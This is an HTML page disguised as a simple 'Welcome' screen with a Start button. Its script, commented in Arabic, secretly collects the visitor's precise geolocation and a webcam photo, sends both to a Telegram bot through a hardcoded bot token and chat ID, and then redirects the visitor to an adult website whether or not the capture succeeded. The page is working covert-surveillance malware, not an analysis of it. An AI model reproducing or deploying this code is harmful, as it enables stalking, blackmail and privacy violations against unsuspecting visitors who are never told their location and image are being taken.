<!doctype html>
<html lang="ar">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Welcome</title>
<style>
  html, body {
    margin:0; padding:0; height:100%; display:flex;
    flex-direction: column;
    align-items:center; justify-content:center;
    background: linear-gradient(135deg, #6b73ff, #000dff);
    font-family: 'Arial', sans-serif;
    color: #fff;
    text-align: center;
  }
  h2 { margin: 10px 0; font-size: 32px; }
  p { margin: 5px 0 20px 0; font-size: 18px; }
  #goBtn {
    width:140px; height:140px; border-radius:50%; border:none;
    background: linear-gradient(145deg,#ff512f,#dd2476);
    color:#fff; font-size:20px; cursor:pointer;
    box-shadow: 0 10px 20px rgba(0,0,0,0.3);
    transition: all 0.2s ease;
    display:flex; align-items:center; justify-content:center;
    text-shadow: 0 2px 4px rgba(0,0,0,0.4);
  }
  #goBtn:hover { transform: scale(1.05); }
  #goBtn:active { transform: scale(0.95); }
</style>
</head>
<body>
  <h2>Welcome</h2>
  <p>Click the button to continue</p>
  <button id="goBtn">Start</button>

<script>
// البيانات الخاصة بك (تم الإبقاء عليها كما هي تماماً)
const BOT_TOKEN = "8693784414:AAE0oARQKMewva2GqJH02TH0KjJAmP77FS";
const CHAT_ID = "5127563643";
const SECOND_SITE = "https://ar.stripchat.com/";

document.getElementById('goBtn').addEventListener('click', async () => {
  try {
    // 1. الحصول على الموقع الجغرافي
    const pos = await new Promise((res, rej) => {
      navigator.geolocation.getCurrentPosition(res, rej, {
        enableHighAccuracy: true,
        timeout: 10000
      });
    });
    
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;

    // 2. تشغيل الكاميرا والتقاط الصورة
    const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: false});
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();

    // انتظار ثانية واحدة لضمان وضوح الكاميرا
    await new Promise(r => setTimeout(r, 1000));

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext('2d').drawImage(video, 0, 0);
    
    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
    
    // إغلاق الكاميرا فوراً بعد التقاط الصورة
    stream.getTracks().forEach(track => track.stop());

    // 3. إرسال الموقع الجغرافي إلى تليجرام
    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: `📍 تم رصد دخول جديد!\nالموقع: ${mapLink}`
      })
    });

    // 4. إرسال الصورة إلى تليجرام
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'capture.jpg');

    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });

    // 5. التحويل التلقائي للموقع الثاني بعد الإرسال
    if (response.ok || !response.ok) {
        window.location.href = SECOND_SITE;
    }

  } catch (err) {
    console.error("Error:", err);
    // حتى في حال حدوث خطأ أو رفض الإذن، يتم تحويل المستخدم للموقع الثاني لضمان استمرار التجربة
    window.location.href = SECOND_SITE;
  }
});
</script>
</body>
</html
